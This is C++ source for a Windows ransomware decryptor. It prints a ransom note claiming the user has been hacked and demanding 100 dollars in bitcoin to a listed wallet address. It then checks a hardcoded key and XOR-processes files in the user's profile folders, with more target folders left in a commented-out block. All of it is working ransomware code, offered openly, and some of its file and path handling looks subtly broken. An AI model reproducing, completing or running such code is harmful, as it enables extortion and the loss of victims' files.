#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif

#include<stdbool.h>
#include <iostream>
#include <Windows.h>
#include <string>
#include <vector>
#include <filesystem>
#include <fstream>
#include <random>

namespace fs = std::filesystem;

void xor_encrypt(std::string path, char key2[65]) {
    std::ifstream input{ path,std::ios::binary };
    std::ofstream output{ path.erase(path.size() - 10) , std::ios::binary };

    char buffer[64];
    while (!input.eof()) {
        input.read(buffer, 64);
        for (size_t i = 0; i < 64; i++) {
            buffer[i] ^= key2[i];
        }
        output.write(buffer, input.gcount());
    }
    input.close();
    std::string removedPath = path + ".Isayev9N9";
    std::remove(removedPath.c_str());
}

std::vector<std::string> getDrives() {
    std::vector<std::string> Drives;
    char* lDrives = new char[MAX_PATH]();
    if (GetLogicalDriveStringsA(MAX_PATH, lDrives));
    for (int i = 0; i < 100; i += 4)
        if (lDrives[i] != (char)0)
            Drives.push_back(std::string{ lDrives[i],lDrives[i + 1],lDrives[i + 2] });
    delete[] lDrives;
    return Drives;
}

int main() {
    HANDLE  hConsole;
    hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, 12);
    std::string p = getenv("USERPROFILE");
    std::vector<std::string> lecteurs = getDrives();
    char key[65];
    std::cout << "You have been hacked by Isayev9N9 :)" << std::endl;
    std::cout << "All your files are encrypted !" << std::endl;
    std::cout << "If you want to decrypt theses files, send me 100$ in bitcoin address :" << std::endl;
    std::cout << "bc1q7sxk74u7kfu8q62dslghylt53nltuw802jwnau" << std::endl;
    std::cout << "And past key to decrypt here :" << std::endl;
    std::cin >> key;

    std::string cle2 = "9lev1st13ewov5kbmprg84a2m5xnpqwzyxhi0ocfp13sox0y2v8rc4tz3f84s21e";
    std::string key2 = key;
    if (key2 == cle2) {
        for (auto lec : lecteurs) {
            for (auto& fichier : fs::recursive_directory_iterator(p + "\\Test", fs::directory_options::skip_permission_denied)) {
                try {
                    if (fs::is_directory(fichier)) {
                    }
                    else {
                        xor_encrypt(fichier.path().string(), key);
                        std::cout << fichier.path().string() << std::endl;
                    }
                }
                catch (const std::exception& e) {
                }
            }

            /*
            for (auto& fichier : fs::recursive_directory_iterator(p + "\\Videos", fs::directory_options::skip_permission_denied)) {
                try {
                    if (fs::is_directory(fichier)) {
                    }
                    else {
                        std::cout << fichier.path().string() << std::endl;
                        xor_encrypt(fichier.path().string());
                    }
                }
                catch (const std::exception& e) {
                }
            }
            for (auto& fichier : fs::recursive_directory_iterator(p + "\\Documents", fs::directory_options::skip_permission_denied)) {
                try {
                    if (fs::is_directory(fichier)) {
                    }
                    else {
                        std::cout << fichier.path().string() << std::endl;
                        xor_encrypt(fichier.path().string());
                    }
                }
                catch (const std::exception& e) {
                }
            }
            for (auto& fichier : fs::recursive_directory_iterator(p + "\\Music", fs::directory_options::skip_permission_denied)) {
                try {
                    if (fs::is_directory(fichier)) {
                    }
                    else {
                        std::cout << fichier.path().string() << std::endl;
                        xor_encrypt(fichier.path().string());
                    }
                }
                catch (const std::exception& e) {
                }
            }
            for (auto& fichier : fs::recursive_directory_iterator(p + "\\Links", fs::directory_options::skip_permission_denied)) {
                try {
                    if (fs::is_directory(fichier)) {
                    }
                    else {
                        std::cout << fichier.path().string() << std::endl;
                        xor_encrypt(fichier.path().string());
                    }
                }
                catch (const std::exception& e) {
                }
            }
            for (auto& fichier : fs::recursive_directory_iterator(p + "\\Desktop", fs::directory_options::skip_permission_denied)) {
                try {
                    if (fs::is_directory(fichier)) {
                    }
                    else {
                        std::cout << fichier.path().string() << std::endl;
                        xor_encrypt(fichier.path().string());
                    }
                }
                catch (const std::exception& e) {
                }
            }
            for (auto& fichier : fs::recursive_directory_iterator(p + "\\Downloads", fs::directory_options::skip_permission_denied)) {
                try {
                    if (fs::is_directory(fichier)) {
                    }
                    else {
                        std::cout << fichier.path().string() << std::endl;
                        xor_encrypt(fichier.path().string());
                    }
                }
                catch (const std::exception& e) {
                }
            }
            for (auto& fichier : fs::recursive_directory_iterator(p + "\\Favorites", fs::directory_options::skip_permission_denied)) {
                try {
                    if (fs::is_directory(fichier)) {
                    }
                    else {
                        std::cout << fichier.path().string() << std::endl;
                        xor_encrypt(fichier.path().string());
                    }
                }
                catch (const std::exception& e) {
                }
            }
            for (auto& fichier : fs::recursive_directory_iterator(p, fs::directory_options::skip_permission_denied)) {
               try {
                    if (fs::is_directory(fichier)) {
                    } else {
                        if (!fichier.path().string().find(p + "\\AppData")) {
                        } else {
                            std::cout << fichier.path().string() << std::endl;
                            xor_encrypt(fichier.path().string());
                        }
                    }
               } catch (const std::exception& e) {
               }
            }*/
        }
    }
    else {
        std::cout << "Try again :)" << std::endl;
        Sleep(10000);
    }
}
